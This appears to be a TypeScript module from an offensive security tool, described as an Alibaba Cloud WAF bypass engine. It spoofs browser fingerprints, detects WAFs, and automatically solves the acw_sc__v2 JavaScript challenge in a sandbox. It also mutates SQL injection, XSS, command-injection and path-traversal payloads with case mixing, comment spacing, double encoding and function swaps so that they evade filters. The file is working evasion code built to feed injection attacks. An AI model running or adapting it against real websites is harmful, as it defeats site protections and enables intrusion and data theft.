/**
 * 阿里云 WAF 突破引擎（纯函数模块，零外部依赖）——被 index.ts 的 sec_waf 工具与
 * withWafContext/httpReq/buildInjected 钩子复用；也可独立 import 做单元测试。
 *
 * 能力：
 *   1) browserHeaders —— 真实浏览器指纹请求头（规避 WAF 机器人识别维度）
 *   2) wafDetect —— 阿里云 WAF / 其他 WAF / 无 识别（拦截页/响应头/JS 挑战特征）
 *   3) acwScV2Solve —— 用 node:vm 直接执行阿里云 acw_sc__v2 JS 挑战，捕获 cookie（不做算法逆向）
 *   4) wafEncodePayload —— 无损编码：SQL 关键字大小写混合 + 引号外空格→/**\/；XSS 标签大小写；CMD 大小写；路径编码
 *   5) wafVariants —— 全变体生成（注释符/空白符/大小写/URL 编码/双重编码/等价函数替换/内联注释）
 *   6) WAF_CTX —— 全局上下文（setWafCtx/getWafCtx），httpReq 读取后自动增强
 */
import { randomInt } from 'node:crypto'

export function sleep(ms: number): Promise<void> {
  return new Promise((r) => setTimeout(r, ms))
}

/** 真实浏览器 UA 池（阿里云 WAF 对无 UA / 爬虫 UA 严格） */
const UA_POOL = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.2535.67',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0',
  'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
]

/** 完整浏览器指纹请求头（模拟真实用户，规避 WAF 的机器人识别维度） */
export function browserHeaders(ua?: string): Record<string, string> {
  const pick = ua || UA_POOL[randomInt(0, UA_POOL.length)]
  return {
    'User-Agent': pick,
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
    'Accept-Encoding': 'gzip, deflate, br',
    'Cache-Control': 'no-cache',
    'Pragma': 'no-cache',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'Referer': 'https://www.baidu.com/',
  }
}

/** WAF 上下文：httpReq / buildInjected 的全局增强开关（一次攻击任务作用域内生效） */
export interface WafCtx {
  mode: 'aliyun' | 'auto'
  ua?: string
  acwCookie?: string
  solved?: boolean
  encode?: boolean
  delayMs?: number
  provider: string
}
let _WAF_CTX: WafCtx | null = null
export function setWafCtx(c: WafCtx | null): void { _WAF_CTX = c }
export function getWafCtx(): WafCtx | null { return _WAF_CTX }

/**
 * WAF 识别：阿里云 WAF 特征（拦截页/响应头/JS 挑战）+ 通用 WAF 特征。
 * 返回 { waf: 'aliyun'|'other'|'none'|'unknown', conf: 0-10, markers, jsChallenge }
 */
export function wafDetect(r: { status: number; text: string; headers?: any } | null): { waf: string; conf: number; markers: string[]; jsChallenge: boolean } {
  const markers: string[] = []
  if (!r) return { waf: 'unknown', conf: 0, markers, jsChallenge: false }
  const t = (r.text || '').slice(0, 200000)
  const hdrPairs: string[] = []
  try { r.headers?.forEach?.((v: string, k: string) => hdrPairs.push(k.toLowerCase() + ': ' + String(v).toLowerCase())) } catch { /* ignore */ }
  const all = (t + '\n' + hdrPairs.join('\n')).toLowerCase()
  const jsChallenge = /acw_sc__v2|acw_tc|__ac_|acwsc|window\._0x|_0x[0-9a-f]{4,}|\.acw\.aliyun|waf.*(challenge|verify)|aliyun.*verify/i.test(all)
  let score = 0
  const ALI: Array<[RegExp, number, string]> = [
    [/www\.aliyun\.com/, 3, '拦截页指向 aliyun.com'],
    [/阿里云web应用防火墙|阿里云waf/, 3, '阿里云 WAF 拦截页'],
    [/\baliyun\b|\baliyundun\b/, 2, '响应含 aliyun 标识'],
    [/error code: ?400/, 2, '阿里云 WAF 400 拦截码'],
    [/anti-?bot|security check|安全验证|安全提醒|禁止访问|访问被拒绝/, 2, '反爬/安全验证特征'],
    [/acw_sc__v2/, 3, 'acw_sc__v2 JS 挑战 cookie'],
    [/x-cache:.*(aliyun|waf)|x-waf|waf-?qps|waf-?rule|x-alicdn/, 2, 'WAF/CDN 响应头'],
    [/x-slb|slb\s*=/, 1, '阿里云 SLB 标识'],
    [/server: ?tengine/, 1, 'Tengine（阿里系）'],
  ]
  for (const [re, w, label] of ALI) if (re.test(all)) { score += w; markers.push(label) }
  if (jsChallenge) score += 2
  const GEN = [/403 forbidden|you don't have permission|access denied/i, /cf-ray|cloudflare/i, /mod_security|modsecurity/i, /incapsula|imperva/i, /safedog|安全狗/i, /360wzws|360.*waf/i]
  let genScore = 0
  for (const re of GEN) if (re.test(all)) genScore++
  if (score >= 3) return { waf: 'aliyun', conf: Math.min(10, score + genScore), markers, jsChallenge }
  if (r.status === 405 && /405|not allowed/i.test(t)) { markers.push('405（阿里云 WAF 常见拦截码）'); return { waf: 'aliyun', conf: 6, markers, jsChallenge } }
  if (genScore >= 2 || (r.status === 403 && /waf|denied|block/i.test(all))) return { waf: 'other', conf: Math.min(10, genScore * 2 + 2), markers: markers.concat(['通用 WAF 特征']), jsChallenge }
  return { waf: 'none', conf: 0, markers, jsChallenge }
}

/** 判定响应是否被 WAF 拦截（状态码 + 特征双重判定） */
export function isWafBlocked(r: { status: number; text: string; headers?: any } | null): boolean {
  if (!r) return false
  if ([403, 405, 406, 418, 493, 509].includes(r.status)) {
    const det = wafDetect(r)
    if (det.waf !== 'none') return true
  }
  return wafDetect(r).conf >= 5
}

/**
 * acw_sc__v2 JS 挑战求解：用 node:vm 直接执行拦截页里的官方混淆 JS
 * （mock document/location/navigator），捕获 document.cookie 赋值，返回 cookie 值。
 * 不做算法逆向，随站点版本自适应。
 */
export async function acwScV2Solve(html: string, hintUrl?: string): Promise<string | null> {
  if (!html || !/acw_sc__v2|_0x/.test(html)) return null
  try {
    const vm = await import('node:vm')
    const scripts: string[] = []
    const re = /<script[^>]*>([\s\S]*?)<\/script>/gi
    let m: RegExpExecArray | null
    while ((m = re.exec(html)) !== null) {
      const s = (m[1] || '').trim()
      if (s && /acw|_0x|cookie|reload/i.test(s)) scripts.push(s)
    }
    if (!scripts.length) return null
    let u: URL | null = null
    try { u = new URL(hintUrl || 'http://target.invalid/') } catch { /* ignore */ }
    const captured: string[] = []
    const mkDoc = () => {
      const cookieStore: Array<{ k: string; v: string }> = []
      return {
        cookie: {
          get value() { return cookieStore.map((c) => c.k + '=' + c.v).join('; ') },
          set value(s: string) {
            captured.push(String(s))
            for (const part of String(s).split(';')) {
              const eq = part.indexOf('=')
              if (eq > 0) {
                const k = part.slice(0, eq).trim()
                const v = part.slice(eq + 1).trim()
                const i = cookieStore.findIndex((c) => c.k === k)
                if (i >= 0) cookieStore[i] = { k, v }; else cookieStore.push({ k, v })
              }
            }
          },
        },
        getElementById: () => null,
        querySelector: () => null,
        querySelectorAll: () => [],
        createElement: () => ({ style: {}, setAttribute() { /* noop */ }, appendChild() { /* noop */ }, removeChild() { /* noop */ }, innerHTML: '', getContext: () => null }),
        addEventListener() { /* noop */ },
        removeEventListener() { /* noop */ },
        createEvent: () => ({ initEvent() { /* noop */ } }),
        body: { appendChild() { /* noop */ }, removeChild() { /* noop */ } },
        head: { appendChild() { /* noop */ } },
        documentElement: { style: {} },
        title: '',
        readyState: 'complete',
        referrer: 'https://www.baidu.com/',
      }
    }
    const doc = mkDoc()
    const mkLoc = () => ({
      href: u ? u.href : 'http://target.invalid/', hostname: u ? u.hostname : 'target.invalid', pathname: u ? u.pathname : '/',
      search: u ? u.search : '', protocol: u ? u.protocol : 'http:', host: u ? u.host : '', origin: u ? u.origin : '', reload() { /* noop */ }, replace() { /* noop */ }, assign() { /* noop */ },
    })
    const loc = mkLoc()
    const sandbox: Record<string, any> = {
      document: doc, location: loc, navigator: { userAgent: UA_POOL[0], platform: 'Win32', language: 'zh-CN', languages: ['zh-CN', 'zh'], cookieEnabled: true, onLine: true },
      console: { log() { /* noop */ }, info() { /* noop */ }, warn() { /* noop */ }, error() { /* noop */ }, debug() { /* noop */ } },
      setTimeout, clearTimeout, setInterval, clearInterval, setImmediate, clearImmediate,
      JSON, Math, Date, String, Number, Array, Object, RegExp, Boolean, parseInt, parseFloat,
      decodeURIComponent, encodeURIComponent, escape, unescape, isNaN, isFinite,
      btoa: (s: string) => Buffer.from(String(s), 'binary').toString('base64'),
      atob: (s: string) => Buffer.from(String(s), 'base64').toString('binary'),
      Buffer, URL, URLSearchParams,
      screen: { width: 1920, height: 1080, colorDepth: 24 }, history: { length: 1 },
      performance: { now: () => Date.now() },
      localStorage: { getItem: () => null, setItem() { /* noop */ }, removeItem() { /* noop */ } },
      sessionStorage: { getItem: () => null, setItem() { /* noop */ }, removeItem() { /* noop */ } },
      requestAnimationFrame: () => 0, cancelAnimationFrame() { /* noop */ },
      addEventListener() { /* noop */ }, removeEventListener() { /* noop */ },
      XMLHttpRequest: class { open() { /* noop */ } send() { /* noop */ } setRequestHeader() { /* noop */ } },
      fetch: () => Promise.resolve({ ok: true, json: () => Promise.resolve({}), text: () => Promise.resolve('') }),
    }
    sandbox.window = sandbox
    sandbox.self = sandbox
    sandbox.top = sandbox
    sandbox.parent = sandbox
    sandbox.globalThis = sandbox
    for (const code of scripts) {
      try {
        vm.runInNewContext(code, sandbox, { timeout: 1500, filename: 'acw-challenge.js' })
      } catch { /* 单个脚本失败继续下一个 */ }
    }
    for (const c of captured) {
      const mm = c.match(/acw_sc__v2\s*=\s*([^;,\s]+)/i)
      if (mm) return mm[1]
    }
    if (sandbox.document?.cookie && typeof sandbox.document.cookie === 'string') {
      const mm = String(sandbox.document.cookie).match(/acw_sc__v2\s*=\s*([^;,\s]+)/i)
      if (mm) return mm[1]
    }
    return null
  } catch { return null }
}

/** SQL 关键字（无损大小写混合变换用） */
const SQL_KEYWORDS = new Set([
  'select', 'union', 'and', 'or', 'not', 'from', 'where', 'order', 'group', 'by', 'having', 'limit',
  'insert', 'into', 'update', 'delete', 'drop', 'alter', 'create', 'table', 'database', 'schema',
  'sleep', 'benchmark', 'waitfor', 'delay', 'pg_sleep', 'if', 'case', 'when', 'then', 'else', 'end',
  'load_file', 'outfile', 'dumpfile', 'information_schema', 'tables', 'columns', 'concat',
  'concat_ws', 'substring', 'substr', 'mid', 'char', 'chr', 'ascii', 'hex', 'unhex', 'version',
  'user', 'current_user', 'session_user', 'system_user', 'like', 'in', 'between', 'exists',
  'null', 'true', 'false', 'declare', 'exec', 'execute', 'xp_cmdshell', 'cast', 'convert', 'count',
  'distinct', 'as', 'inner', 'left', 'right', 'join', 'on', 'values', 'show', 'grant',
])
/** 混合大小写：SeLeCt 风格（偶数位大写，对 SQL/HTML/CMD 均无损） */
function caseMixWord(w: string): string {
  if (w.length <= 1) return w
  return w.split('').map((c, i) => (i % 2 === 0 ? c.toLowerCase() : c.toUpperCase())).join('')
}

/**
 * 无损编码：保持后端解析语义不变的前提下绕 WAF 正则。
 *  - SQL：关键字大小写混合 + 引号外空格 → /**\/（MySQL/MSSQL 均支持注释替代空白）
 *  - XSS：标签名/属性名大小写混合（HTML 解析大小写不敏感）
 *  - CMD：命令大小写混合（Windows/cmd 不敏感）
 *  - PATH：../ → ..%2f 编码变体
 */
export function wafEncodePayload(payload: string): string {
  if (!payload) return payload
  const low = payload.toLowerCase()
  if (/<script|<img|onerror|onload|javascript:|<svg|<iframe/i.test(low) && /<[a-z]+/i.test(payload)) {
    // XSS：标签名/属性名大小写混合
    return payload
      .replace(/<(\/?)([a-zA-Z][a-zA-Z0-9]*)/g, (_m, slash: string, tag: string) => '<' + slash + caseMixWord(tag))
      .replace(/\b(on[a-z]+)\s*=/gi, (_m, attr: string) => caseMixWord(attr) + '=')
      .replace(/\b(javascript:)/gi, (_m, p: string) => caseMixWord(p))
  }
  if (/select|union|sleep|benchmark|waitfor|information_schema|load_file|concat|outfile|xp_cmdshell/i.test(low)) {
    // SQL：关键字大小写混合 + 引号外空格 → /**/（保留 -- 注释与引号内内容）
    let out = ''
    let inS = false, inD = false
    for (let i = 0; i < payload.length; i++) {
      const ch = payload[i]
      const nxt = payload[i + 1] ?? ''
      if (ch === "'" && !inD) { inS = !inS; out += ch; continue }
      if (ch === '"' && !inS) { inD = !inD; out += ch; continue }
      if (!inS && !inD && ch === '-' && nxt === '-') { out += payload.slice(i); break }
      if (!inS && !inD && ch === ' ') { out += '/**/'; continue }
      if (!inS && !inD && /[a-zA-Z]/.test(ch)) {
        let j = i
        while (j < payload.length && /[a-zA-Z_]/.test(payload[j])) j++
        const word = payload.slice(i, j)
        out += SQL_KEYWORDS.has(word.toLowerCase()) ? caseMixWord(word) : word
        i = j - 1
        continue
      }
      out += ch
    }
    return out
  }
  if (/powershell|cmd\.exe|whoami|net user|dir |type |certutil|curl |wget |bash |sh -c|nc |netcat/i.test(low)) {
    // CMD：命令大小写混合
    return payload.replace(/\b(powershell|cmd|cmd\.exe|whoami|net|dir|type|certutil|curl|wget|bash|nc|netcat)\b/gi, (w: string) => caseMixWord(w))
  }
  if (/\.\.\//.test(payload) || /\.\.%2f/i.test(payload)) {
    return payload.replace(/\.\.\//g, '..%2f')
  }
  return payload
}

/** payload 类型推断 */
export function guessPayloadType(payload: string): string {
  const low = (payload || '').toLowerCase()
  if (/<script|<img|onerror|onload|javascript:|<svg|<iframe/.test(low)) return 'xss'
  if (/select|union|sleep|benchmark|information_schema|waitfor|'/.test(low)) return 'sql'
  if (/powershell|cmd|whoami|wget|curl|bash|nc /.test(low)) return 'cmd'
  if (/\.\.\/|%2e%2e/.test(low)) return 'path'
  return 'sql'
}

/**
 * 变体生成器：覆盖阿里云 WAF 主流绕过面。
 * 返回 [{label, payload}]——每个变体保持后端语义（除显式标注的探测类）。
 */
export function wafVariants(payload: string, ptype?: string): Array<{ label: string; payload: string }> {
  const type = (ptype || guessPayloadType(payload)).toLowerCase()
  const v: Array<{ label: string; payload: string }> = [{ label: '原始', payload }]
  const enc = (s: string) => s
    .replace(/'/g, '%27').replace(/\s+/g, '%20').replace(/"/g, '%22').replace(/</g, '%3c').replace(/>/g, '%3e').replace(/#/g, '%23')
  const dbl = (s: string) => s
    .replace(/'/g, '%2527').replace(/ /g, '%2520').replace(/"/g, '%2522').replace(/</g, '%253c').replace(/>/g, '%253e')
  if (type === 'sql') {
    v.push({ label: '注释符 /**/', payload: payload.replace(/ /g, '/**/') })
    v.push({ label: '空白符 %0a', payload: payload.replace(/ /g, '%0a') })
    v.push({ label: '空白符 %09', payload: payload.replace(/ /g, '%09') })
    v.push({ label: '大小写混合', payload: wafEncodePayload(payload) })
    v.push({ label: '注释+大小写', payload: wafEncodePayload(payload.replace(/ /g, '/**/')) })
    v.push({ label: 'URL 全编码', payload: enc(payload) })
    v.push({ label: '双重编码', payload: dbl(payload) })
    if (/sleep\s*\(/i.test(payload)) {
      v.push({ label: 'SLEEP→BENCHMARK', payload: payload.replace(/sleep\s*\((\d+)\)/gi, "benchmark(10000000,md5('x'))") })
      v.push({ label: 'SLEEP→PG_SLEEP', payload: payload.replace(/sleep\s*\((\d+)\)/gi, 'pg_sleep($1)') })
    }
    if (/\band\b/i.test(payload)) v.push({ label: 'AND→&&', payload: payload.replace(/\band\b/gi, '&&').replace(/ /g, '/**/') })
    if (/select/i.test(payload)) v.push({ label: '内联注释 /*!50000*/', payload: payload.replace(/\bselect\b/gi, '/*!50000select*/') })
  } else if (type === 'xss') {
    v.push({ label: '标签大小写', payload: wafEncodePayload(payload) })
    v.push({ label: 'URL 编码', payload: enc(payload) })
    v.push({ label: '双重编码', payload: dbl(payload) })
    v.push({ label: 'HTML 实体 <', payload: payload.replace(/</g, '&lt;').replace(/>/g, '&gt;') })
  } else if (type === 'cmd') {
    v.push({ label: '命令大小写', payload: wafEncodePayload(payload) })
    v.push({ label: '空格 %20', payload: payload.replace(/ /g, '%20') })
    v.push({ label: 'tab 分隔', payload: payload.replace(/ /g, '\t') })
    v.push({ label: 'URL 编码', payload: enc(payload) })
  } else if (type === 'path') {
    v.push({ label: '单编码 %2e%2e', payload: payload.replace(/\.\.\//g, '%2e%2e/') })
    v.push({ label: '双编码 %252e', payload: payload.replace(/\.\.\//g, '%252e%252e/') })
    v.push({ label: '分号后缀 ..;/', payload: payload.replace(/\.\.\//g, '..;/') })
    v.push({ label: 'URL 编码', payload: enc(payload) })
  } else {
    v.push({ label: '大小写混合', payload: wafEncodePayload(payload) })
    v.push({ label: 'URL 编码', payload: enc(payload) })
  }
  const seen = new Set<string>()
  return v.filter((x) => { if (seen.has(x.payload)) return false; seen.add(x.payload); return true })
}
